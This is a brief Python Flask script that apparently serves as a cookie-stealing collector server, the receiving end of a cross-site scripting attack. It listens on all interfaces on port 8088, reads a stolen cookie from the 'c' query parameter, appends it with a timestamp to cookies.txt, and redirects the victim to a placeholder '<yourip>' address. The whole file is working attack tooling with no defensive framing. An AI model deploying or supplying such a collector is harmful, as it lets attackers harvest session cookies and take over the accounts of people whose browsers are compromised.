from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__) # create app

@app.route('/') # local URL dir
def cookie():
    # write inbound cookie to cookies.txt

    cookie = request.args.get('c')
    f = open("cookies.txt","a")
    f.write(cookie + '' + str(datetime.now()) + '\n')
    f.close()

    # redirect user to somewhere

    return redirect("https://<yourip>:8088")

if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=8088) #listen on all the things
